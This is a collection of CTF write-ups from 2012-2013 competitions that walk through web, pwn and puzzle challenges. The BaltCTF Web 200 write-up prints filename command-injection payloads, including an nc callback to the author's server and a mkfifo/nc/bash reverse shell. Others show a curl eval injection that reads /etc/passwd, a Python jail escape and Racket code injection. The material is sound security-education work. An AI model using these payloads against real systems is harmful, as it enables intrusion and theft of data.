<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-davidmah
description: CTF writeups and security challenges by DavidMah.
---

# Writeups by DavidMah

Source repository: `/repos/DavidMah`

## Repository Index

- ctf-writeups/README.md
- ctf-writeups/baltctf/web200.md
- ctf-writeups/forbidden-bits/README.md
- ctf-writeups/forbidden-bits/x96.md
- ctf-writeups/nullcon-hackim/README.md
- ctf-writeups/nullcon-hackim/web200.md
- ctf-writeups/phdays-quals/README.md
- ctf-writeups/phdays-quals/pwn300.md
- ctf-writeups/phdays-quals/pwn400.md
- ctf-writeups/polictf/README.md
- ctf-writeups/polictf/bin200.md
- ctf-writeups/polictf/grabbag300.md

## Writeup Content


### File: ctf-writeups/README.md

# CTF Writeups

This is my collection of writeups from ctfs that I've participated in.

I regularly compete with the University of Washington Security Team. We
call ourselves [Batman's Kitchen](http://uwctf.cs.washington.edu/)

[CTFTime Page](http://ctftime.org/team/3135/)

I only make writeups for problems that I can take most of the credit
for. In a CTF, I'll look at a lot of problems and contribute with my
teammates on many problems. These writeups are only for problems that I
really took the reins of.



### File: ctf-writeups/forbidden-bits/README.md

# PoliCTF

[Forbidden Bits](http://ctf.forbiddenbits.net/) happened March 15-17,
2013

Batman's Kitchen came in 45th place with 1625 points.

Write Ups:
* X96



### File: ctf-writeups/nullcon-hackim/README.md

# Nullcon HackIM CTF 2013

[HackIM CTF](http://ctf.nullcon.net/readme.php) happened February 2-4,
2013.

Batman's Kitchen came in 48th place with 4200 points.

Write Ups:
* Web 200



### File: ctf-writeups/phdays-quals/README.md

# PHDays Qualifiers

[PHDays Qualifiers](http://quals.phdays.com/) happened December 14-16, 2012

Batman's Kitchen came in 17th place with 2600 points.

Write Ups:
* Pwn 300
* Pwn 400



### File: ctf-writeups/polictf/README.md

# PoliCTF

[PoliCTF](http://www.polictf.it/home/home.html) happened November 17-18,
2012

Batman's Kitchen came in 5th place with 2024 points.

Write Ups:
* Grab Bag 300
* Bin 200



### File: ctf-writeups/baltctf/web200.md

# Web 200

Web 200 is a php website that lets you upload images. Whenever you upload an
image, it stores it under your 'gallery', so you can see the images that
you've already uploaded.

For every file, it renames it and stores it in the 
`uploads/<phpsession>/<file-index>-<original file name>`  directory of
the website.

The exact same file that is uploaded is what is presented (so no
compression or parsing of the image file in any way happens).

The website declares that only pngs and gifs may be uploaded. It turns
out that the website checks for these filetypes by file extension. That
is, a png file that is renamed to be .jpg will be rejected, and a .jpg
that is renamed to .png will be accepted.

It turns out that we can inject almost arbitrary shell code into the
file names of our images and have them execute. Interestingly enough,
our file names can not have the / character in them, (because that would
be a directory in posix), so we cannot inject / characters.

    “nomnom; pwd | nc <OUR SERVER DNS> 9042;hooray.png"

Uploading a file with this name connected back to our server and dumped
the working directory of the web process.

We created a callback shell, and dug around.

    nomnom; cd .. && cd .. && cd tmp && mkfifo paip; foo.png
    nomnom; cd .. && cd .. && cd tmp && cat paip | nc <OUR SERVER> 1337 | bash > paip; foo.pngo

And found exactly why the filenames were letting us execute arbitrary
code. It's because the php used executed shell code to move our image
into the proper directory.

    shell_exec("mv $tmpfname $userdir/$c-\"\$(echo $file_name | cut -c1-16)\".$ext");

The flag was in the file at `/var/www/picture`

    c5e7b971c62296dcae64fb7fabf169c6



### File: ctf-writeups/forbidden-bits/x96.md

# Forbidden Bits X96 (150 Points)

Forbidden bits is a game. Initially, an IP and Port are given: `95.170.82.211:3000`.
Additionally, there is some message that says "Try to win the game".

Connecting to that socket starts the game.

        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         _    _  96   _________   ______   ______  _    _  _____  ______   ______ 
        \ \  / /     | | | | | \ | |  | | | |     | |  | |  | |  | |  \ \ | |     
         >|--|<      | | | | | | | |__| | | |     | |--| |  | |  | |  | | | |---- 
        /_/  \_\     |_| |_| |_| |_|  |_| |_|____ |_|  |_| _|_|_ |_|  |_| |_|____ 

        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



        stupid captcha MSWJSBCQ

Can type the captcha to have it start presenting crap. Note that
whatever this outputs in the web browser is probably different from the
terminal, because many characters aren't cleanly printable in ASCII.
It's more clear in the terminal that this is **16 characters**.

        Your Score 0;
        r9\yFi��Sv�????

I suppose that this is a puzzle of some sort. There's very little
direction to be immediately gained from this, so I just typed in random
crap and hit enter.

        Your Score 0;
        r9\yFi��Sv�????

        Your Score 0;
        +#Q8?7eLSKy`????

So clearly no points are earned. (This wasn't my original output, and
I've ommitted my input).

My plan was to probe the game a bit and gather samples of this text. so I
started to mash enter. Before I collected the samples, I encountered
something interesting like this:

        Your Score 0;
        +#*M+#*M+#*M????

The sequence, **+#*M**, shows up three times consecutively. It is
**four** characters long, and after there is a **four** character long
string of **????**. So... continue the pattern? I input the same four
characters.

        Your Score 0;
        +#*M+#*M+#*M????
        +#*M

        Your Score 1;

So following the pattern was definitely the right move. I try to keep
playing, but my failure on the next problem causes my score to revert to
0. But this is enough information to analyze the rest of the samples I
have! Some things that I know (or can sort of imply):

* I must enter a four character string to fill in the ????
* The 12 characters preceding the ??? are really **four blocks** of **three
  characters**
* **The ???? follows a pattern from the previous three chunks**, where that
  pattern is to just repeat the block if all three of the chunks are the
  same.

So, I'll analyze one of these problems:

        jC<3tMF=~WPG????

In some of the problems, not all of the symbols are printable. So I'll
get a hexdump of the whole thing.

        echo -en "jC<3tMF=~WPG????" | xxd -p
        6a433c33744d463d7e5750473f3f3f3f

It'd be best to separate this into separate clusters of four
characters. I also am throwing out the ???? to reduce distractions.

        6a433c33
        744d463d
        7e575047

I noticed that the differences in the least significant digit has the
same increment. That is,  **3 -> d is 10**, and **d -> 7 is 10**.
Playing with this, it turns out that [third line] - [second line] =
[second line] - [first line].

        744d463d - 6a433c33 = a0a0a0a
        7e575047 - 744d463d = a0a0a0a

It is worth considering that **[fourth line] = [third line] + [second
line] - [first line]**. That is, add the same increment to the third
value to get the ????. This turns out to be the answer.

         7e575047 + a0a0a0a = 88615a51

I need to transform this back into characters to enter this in.

        echo -en "88615a51" | xxd -p -r
        �aZQ

And it works.

        Your Score 1;

Since it's not certain how many points are necessary to 'win' (I also
considered the possibility that the puzzle changes after a certain
point), I automated the process in ruby. Some things of note.

* My script uses a file called **game_output.txt** to store the game's output
  and the ruby program's input. I do this instead of pipes and file
  descripter redirecting for a few reasons:

    * I can in the game captcha manually
    * My ruby code does have to read the input as a stream.
    * I can tail game_output.txt in another terminal to monitor what is
      going on

* It is necessary to explicitly flush standard output after printing,
  because the game is interactive. (I spent a while frustrated with
  this small complication).


        # play_game.rb

        # Captcha
        puts gets()
        $stdout.flush()

        while true
          # Wait a little bit for input to come from the game
          sleep(1)

          # Read the game's most recent output into four strings
          file = open("game_output.txt")
          file.seek(file.size - 17) # 17 to account for \n
          data = []
          4.times { |index| data << file.read(4).chomp() }

          # Convert into 32 bit Big Endian
          int_data =  data.map{|d| d.unpack("N")}.flatten()

          # Compute the increment
          diff = int_data[2] - int_data[1]

          # Calculate the true int value of ????
          final = (int_data[2] + diff).to_s(16)

          # Convert to the ASCII version
          result = `echo -n #{final} | xxd -r -p`

          puts result
          $stdout.flush
        end

Then I ran the game with the following:

        ruby play_game.rb | nc 95.170.82.211 3000 > game_output.txt

The score goes up to 10, and the following gets dumped before the socket
gets closed.

        FLAG {5tupid_n4sty_g4m3}



### File: ctf-writeups/nullcon-hackim/web200.md

# Web 200

Web 200 is a sort of web bulletin board.

You can make an account, log in, post messages (which appear in
a large public list of all 'posts'), and view your own messages.

![Full Listing](assets/web200/flag_listing.png)

It seems that there is an **admin** account with a **flag** post. It
turns out that the goal of the puzzle is to illegally read the post.

I made the user **apple**, and then made a post titled **sdfsdf**. The
contents of the post was also **sdfsdf**. I probably should have
made them different.


![Own Post's Listing](assets/web200/own_listing.png)

As the picture shows, I can see other people's post titles and my own,
but I cannot see the contents. I can click View next to my own post to see the contents of my post.

![View Post](assets/web200/view_post.png)

Upon inspection of my network tabs, it's clear that clicking View
creates an ajax request to retrieve the description data.

![Ajax Request](assets/web200/ajax_request.png)

The source of the web page contains the following code:

    $.ajax({
        type: "POST",
        url: "view.php",
        data:"View=View&id="+id,
        success: function(msg) {
            alert(msg);
        }
    });

Mutate it to be that of the flag, and fire. With trial and error, It turns out that the flag's
id is 1, not 0.

    $.ajax({
        type: "POST",
        url: "view.php",
        data:"View=View&id="+1,
        success: function(msg) {
            alert(msg);
        }
    });

![Ajax Request](assets/web200/flag.png)

    ChutkiisVERYcute




### File: ctf-writeups/phdays-quals/pwn300.md

# PHDays Quals PWN 300

PWN 300 is a 'south park administration' website.

It only has a form:

* Select between {Kenny, Stan, Kyle, Eric, Butters, Token}
* Radio buttons for {Kill, Arrest, Bankrupt}
* Submit button

Click submit, and it'll return a message like `Kenny was killed`,
depending on the input.

The html source code provides a comment, stating that **the flag is inside
of /etc/passwd**. We are also given the source code for the website.

**web.py** is a python twisted web server.
By default, it serves the main web page, which is hard coded as a
string. For POST requests, it passes the arguments from the request to a
function from the other file.

**process.pyc** is compiled python that web.py makes use of.

We decompile process.pyc to get process.py. Thanks [unpyc](http://code.google.com/p/unpyc/). There is one issue with the decompiled code. A line inside of the 'create_function' function in process.py reads: 

    consts = ((None,) + (human))

Which doesn't work. Change it so that it does what it probably was meant
to do.

    consts = tuple([None, human])

Now it is possible to run web.py locally and have the same output as the
online version.

**process.py** provides a function that dynamically builds up another
function. What it does:

* Builds up an list of information needed for a python code object.
* Passes the list into types.codeType to generate a python code object.
* Passes the python code object into types.FunctionType to create a function.
* Calls the resultant function and passes the output string back to
  web.py.

It turns out that we don't actually need to understand how python code
objects work to exploit this.

Here is the bottom of process.py, which is all that we actually need to
exploit this.

    def kill(name):
        return ('%s was killed' % name)

    def arrest(name):
        return ('%s was arrested' % name)

    def bankrupt(name):
        return ('%s was bankrupted' % name)

    def process(args):
        actions = tuple(args['actions'])
        choice = args['choice'][0]
        human = args['human'][0]
        return create_function('myfunc', 0, choice, actions, human)()

When printed, args looks like this (depends on what the web client passes in):

    {'actions': ['kill', 'arrest', 'bankrupt'], 'human': ['Kenny'], 'choice': ['\x00']} 

Based on the value inside of 'choice', process.py will choose one of the
options inside of 'actions', which correspond to function names to use
in the dynamically generated function. The first value inside of 'human'
gets passed in as an argument. We can replace one of the functions with
eval. We want args to look like:

    {'actions': ['eval', 'arrest', 'bankrupt'], 'human': ['str(open("/etc/passwd"))'], 'choice': ['\x00']}

Construct a request to send in these parameters:

    $ curl -d "actions=eval&actions=arrest&human=str(open(\"/etc/passwd\").read())&choice=%00" http://ctf.phdays.com:2137

And it dumps /etc/passwd, which contains the flag in plaintext.

    d9301a72ee12eabb2b913398a3fab50b



### File: ctf-writeups/phdays-quals/pwn400.md

# PHDays Quals PWN 400

PWN 400 is a python jail. We are given a python REPL, but most useful
functions and builtins are deleted from the global namespace. We are
offered one function, **Reader(filename)**, but it can only read three
files:

* log.1
* log.2
* log.3

The files contain dumps of trollfaces :(.

We're also given the source code, which has two files.

**pyjail.py** is the REPL. This is the most important code:

    inp = raw_input('>>> ')
    a = None
    exec 'a=' + inp

**secure_reader.py** is the script that makes the REPL annoying to use.

    UNSAFE_BUILTINS = [
        'open', 'file', 'execfile', 'reload', 'input', 'eval', 'type', 'compile'
        ]

    UNSAFE_ATTRS = [
        '__globals__', '__closure__'
        ]

    ALLOWED_FILES = [
        'log.1', 'log.2', 'log.3'
        ]

...

    def remove_builtins():
        for item in UNSAFE_BUILTINS:
            del __builtin__.__dict__[item]
        def null(*args, **kwargs):
            pass
        __builtin__.__import__ = null

...

    del dictionary_of(type)['__subclasses__']
    del dictionary_of(GeneratorType)['gi_frame']
    del dictionary_of(FrameType)['f_code']
    del dictionary_of(FrameType)['f_builtins']
    del dictionary_of(FrameType)['f_globals']
    del dictionary_of(GeneratorType)['gi_code']

And so on

So it removes most of the usable functions. Here is how it defines the
Reader function:

    def _Reader(
        open_file=open,
        type=type,
        TypeError=TypeError,
        Namespace=Namespace,
        ):

        @guard(filename=str)
        def Reader(filename):
           if filename not in ALLOWED_FILES:
               raise ValueError("You can't read that shit!")
           data = open_file(filename).read()
           return data

        return Reader

    Reader = _Reader()

The outside function **_Reader** returns the inside function **Reader**,
which is what we have access to. It is important to realize that **if Reader
can read files at all, then it must have access to some file reading
mechanism**. It calls 'open_file', which is really just an alias to
'open'. We get the open function through the Object Tree starting with
the Reader function.

    Reader.func_globals['_Reader'].func_defaults[0]

We can also read the **/etc/passwd** file directly now

    Reader.func_globals['_Reader'].func_defaults[0]('/etc/passwd').read()

Which contains the flag in plaintext.

    41f20268caa093e1b746e5ca750d3aa0



### File: ctf-writeups/polictf/bin200.md

# PoliCTF Bin/Pwn 200

Bin 200 exposes a calculator application running on some port.

    mah@mah-MacBookAir ~ % nc -p 9003 calc.challenges.polictf.it 4000
    Write the first number:5
    Write the operator:*
    Write the second number:5
    25

The calculator concatenates \[Operator Text] \[First Number Text] \[Second Number
Text] and runs a polish notation calculation on the text. The polish
notation calculation is actually a racket evaluator. I imagine source
logic sort of like:

    echo "( $OPERATOR_TEXT $FIRST_NUMBER_TEXT $SECOND_NUMBER_TEXT )" | racket

Racket was determined by a few things. First consider Polish notation
languages. The calculator handled fraction math and responded to scheme
boolean functions with #t and #f. Racket from Scheme was distinguished
creating an if statement with no else.

    Write the first number:if #t 1
    Write the operator:
    Write the second number:

This stalls and fails, so it is racket.

We can then find and expose the flag

    Write the first number:foldr (lambda (x y) (string-append x " " y)) "" (map (lambda (x) (path->string x)) (directory-list (current-directory)))
    Write the operator:
    Write the second number:
    flag.txt challenge

    Write the first number:read-line (open-input-file "flag.txt")
    Write the operator:
    Write the second number:
    cb1228e2387cc12ad30fd4243fc23a0

Interestingly, functions file->string and system don't work.



### File: ctf-writeups/polictf/grabbag300.md

# PoliCTF Grab Bag 300

Grab Bag 300 gives you an html file with embedded obfuscted javascript
and a picture of mr.hanky the christmas poo encoded in base64 in the
html file.

The embedded code looks something like:

    eval(function( some parameters ) {
          e = function(c) {  Does some stuff }
          // some more code that returns text
        }(a huge wall of text for parameters));

    )

Running the code causes this:

    Uncaught RangeError: Maximum call stack size exceeded

The function e returns a base(a) encoding of c, where a is another
parameter given to the outside function as a whole, and c is the
parameter passed directly to e.

    e = function (c) {
        return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };

Observing in chrome has us notice that e calls e recursively up until
the point it breaks. Replace e with an iterative equivalent.

    e = function (c) {
        if(c == 0)
          return "0";
        remainder = c
        result = ""
        while (remainder > 0) {
            temp = remainder
            result = ((temp = temp % a) > 35 ? String.fromCharCode(temp + 29) : temp.toString(36)) + result;
            remainder = parseInt(remainder / a);
        }
      	return result;
    }

The function call no longer breaks, but the eval on the returned code
causes a similar issue. The call stack size is exceeded, and it is from
e calling e. The eval broke. Take all of the text that the function
returned, and put it in an html file. It has some difference, but
redefines an e that does the same thing. Replace it again, because there
is actually another eval produced from that text.

Do this replacement of e one more time (so it's been replaced three
times total). Send that code through again and witness something totally
different. Now there is code not wrapped in eval that breaks.

    Uncaught ReferenceError: Arrray is not defined 

%s/Arrray/Array/g on the file and open this file:

    69454623829323481e291a32e7b40aa0

I worked this out with five files:

* challenge.html - the original source
* test1.html - A file that only has the script tag from challenge.html.
  Replace recursive e with iterative e
* test2.html - A file that has the text that the anonymous function in
  test1.html returns. Replace recursive e with iterative e
* test3.html - A file that has the text that the anonymous function in
  test2.html returns. Replace recursive e with iterative e
* test4.html - A file that has the text that the anonymous function in
  test3.html returns. Search/Replace Arrray with Array

